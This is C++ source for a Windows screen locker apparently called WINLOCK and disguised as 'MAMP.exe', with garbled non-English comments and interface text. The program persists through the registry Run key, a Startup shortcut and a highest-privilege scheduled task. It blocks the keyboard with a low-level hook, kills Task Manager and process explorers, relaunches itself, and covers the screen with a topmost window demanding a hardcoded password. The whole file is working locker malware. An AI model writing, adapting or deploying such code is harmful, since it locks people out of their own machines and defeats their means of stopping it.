#include <windows.h>
#include <tlhelp32.h>
#include <winreg.h>
#include <string>
#include <iostream>
#include <shlobj.h>  // ��� `SHGetFolderPath`

#define PASSWORD "314159265"

HWND hwnd;
HINSTANCE hInst;
std::string enteredPassword = "";

// === ������� ������ �������� �� ����� ===
DWORD FindProcessID(const char* processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(PROCESSENTRY32);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(processesSnapshot, &processInfo)) {
        do {
            if (!strcmp(processInfo.szExeFile, processName)) {
                CloseHandle(processesSnapshot);
                return processInfo.th32ProcessID;
            }
        } while (Process32Next(processesSnapshot, &processInfo));
    }

    CloseHandle(processesSnapshot);
    return 0;
}

// === ������� ����������� WINLOCK, ���� ��� ������� ===
void AutoRestart() {
    while (true) {
        Sleep(3000);  // �������� ������ 3 �������
        DWORD pid = FindProcessID("MAMP.exe");
        if (pid == 0) {
            ShellExecute(NULL, "open", "MAMP.exe", NULL, NULL, SW_HIDE);
        }
    }
}

// === ������� ���������� `Task Manager` � ���������� ������ ===
void WatchTaskManager() {
    const char* targets[] = { "Taskmgr.exe", "ProcessHacker.exe", "procexp64.exe" };

    while (true) {
        Sleep(1000);
        for (const char* proc : targets) {
            DWORD pid = FindProcessID(proc);
            if (pid) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                TerminateProcess(hProcess, 1);
                CloseHandle(hProcess);
                ShellExecute(NULL, "open", "MAMP.exe", NULL, NULL, SW_HIDE);
            }
        }
    }
}

// === ��������, �������� �� ��������� � ������� �������������� ===
bool IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdminGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &pAdminGroup)) {
        CheckTokenMembership(NULL, pAdminGroup, &fIsRunAsAdmin);
        FreeSid(pAdminGroup);
    }

    return fIsRunAsAdmin;
}

// === ������ ��������� � ������� �������������� (���� �������� ��� ���) ===
void RunAsAdmin() {
    if (!IsRunAsAdmin()) {
        char path[MAX_PATH];
        GetModuleFileName(NULL, path, MAX_PATH);

        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = "runas";  // ������ �� ����� ��������������
        sei.lpFile = path;
        sei.nShow = SW_SHOWNORMAL;

        if (!ShellExecuteEx(&sei)) {
            MessageBox(NULL, "Failed to restart as admin!\nPlease run manually as Administrator.", "Error", MB_ICONERROR);
            exit(1);
        }

        exit(0);
    }
}

// === ���������� � ���������� ===
void AddToStartup() {
    RunAsAdmin();  // ����������� ������ �� ����� ��������������

    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    // === 1 ������ � ������ (CURRENT_USER ������ LOCAL_MACHINE) ===
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "MAMP", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
    else {
        MessageBox(NULL, "Failed to write to registry!", "Error", MB_ICONERROR);
    }

    // === 2 ����������� ������ � "������������" (Startup) ===
    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        std::string shortcutPath = std::string(startupPath) + "\\MAMP.lnk";

        std::string cmd = "cmd /c echo [InternetShortcut] > \"" + shortcutPath + "\" && "
            "echo URL=file://" + std::string(path) + " >> \"" + shortcutPath + "\"";
        system(cmd.c_str());
    }

    // === 3 ���������� � Task Scheduler (����� �� ���������� ������������) ===
    std::string taskCmd = "schtasks /Create /SC ONLOGON /TN \"MAMP AutoStart\" /TR \"" + std::string(path) +
        "\" /RL HIGHEST /F";
    system(taskCmd.c_str());

    // === 4 ��������� ������ (���� ��� ���������) ===
    system("schtasks /Change /TN \"MAMP AutoStart\" /ENABLE");

    MessageBox(NULL, "MAMP successfully added to Startup!", "Success", MB_OK | MB_ICONINFORMATION);
}

// === ���������� ���������� (���� ��������) ===
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) return 1;
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void BlockKeyboard() {
    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
}

// === �������� ������ ===
void CheckPassword(HWND hwnd) {
    if (enteredPassword == PASSWORD) {
        MessageBox(hwnd, "�� ��������!", "������� ��������������", MB_OK);
        PostQuitMessage(0);
    }
    else {
        MessageBox(hwnd, "�������� ������!", "�������� ��� ���", MB_OK);
    }
}

// === ���������� ����� � ���� ����� ===
void AddNumber(HWND hEdit, const char* number) {
    enteredPassword += number;
    SetWindowText(hEdit, enteredPassword.c_str());
}

// === GUI ���� ===
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit, hButton, hBackspace, hTitle, hWarning;
    static HWND numButtons[10];

    switch (uMsg) {
    case WM_CREATE: {
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, width, height, SWP_SHOWWINDOW);

        // ���
        SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND, (LONG_PTR)CreateSolidBrush(RGB(0, 0, 0)));

        // ��������� (�����������)
        hTitle = CreateWindow("STATIC", "�������� � ���� ������߻", WS_CHILD | WS_VISIBLE | SS_CENTER,
            width / 2 - 300, height / 4 - 50, 600, 50, hwnd, NULL, NULL, NULL);
        SendMessage(hTitle, WM_SETFONT, (WPARAM)GetStockObject(SYSTEM_FONT), TRUE);

        // ������� ��������������
        hWarning = CreateWindow("STATIC", "�� �����, ��� ������������� �������.\n�� ���, ���� ��� ������ �������������� ����?\n\n\n����, �������� �� ��������, � ����� ������ ���������� �����\n===============\n���� � ���� ����� �����\n===============\n�������� ������, ��������� � ��� � �������\n\n� ����� �������������. ������ ���� �����������.\n �����... ����� �����������. � ��� � ��� ����� �����",
            WS_CHILD | WS_VISIBLE | SS_CENTER, width / 2 - 300, height / 4, 600, 200, hwnd, NULL, NULL, NULL);
        SendMessage(hWarning, WM_SETFONT, (WPARAM)GetStockObject(SYSTEM_FONT), TRUE);

        // ���� �����
        hEdit = CreateWindow("EDIT", "", WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_AUTOHSCROLL,
            width / 2 - 120, height / 2, 200, 30, hwnd, (HMENU)1, NULL, NULL);

        // ������ "Unlock"
        hButton = CreateWindow("BUTTON", "�� ������� ����", WS_CHILD | WS_VISIBLE,
            width / 2 - 75, height / 2 + 50, 150, 40, hwnd, (HMENU)2, NULL, NULL);

        // ������ "Backspace"
        hBackspace = CreateWindow("BUTTON", "<", WS_CHILD | WS_VISIBLE,
            width / 2 + 70, height / 2, 50, 30, hwnd, (HMENU)3, NULL, NULL);

        // �������� ������
        for (int i = 0; i < 10; i++) {
            std::string text = std::to_string(i);
            numButtons[i] = CreateWindow("BUTTON", text.c_str(), WS_CHILD | WS_VISIBLE,
                width / 2 - 190 + (i * 40), height / 2 + 100, 35, 35, hwnd, (HMENU)(4 + i), NULL, NULL);
        }
        break;
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == 2) {
            CheckPassword(hwnd);
        }
        else if (LOWORD(wParam) == 3) {
            if (!enteredPassword.empty()) {
                enteredPassword.pop_back();
                SetWindowText(hEdit, enteredPassword.c_str());
            }
        }
        else if (LOWORD(wParam) >= 4 && LOWORD(wParam) <= 13) {
            std::string num = std::to_string(LOWORD(wParam) - 4);
            AddNumber(hEdit, num.c_str());
        }
        break;

    case WM_CLOSE:
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return 0;
}

// === ������� ������� ===
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    hInst = hInstance;

    AddToStartup();
    BlockKeyboard();

    // ��������� ������ ����
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "LockWindow";

    RegisterClass(&wc);

    hwnd = CreateWindowEx(WS_EX_TOPMOST, "LockWindow", "WINLOCK", WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, SW_SHOW);

    // ������ ������� �������
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WatchTaskManager, NULL, 0, NULL);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AutoRestart, NULL, 0, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
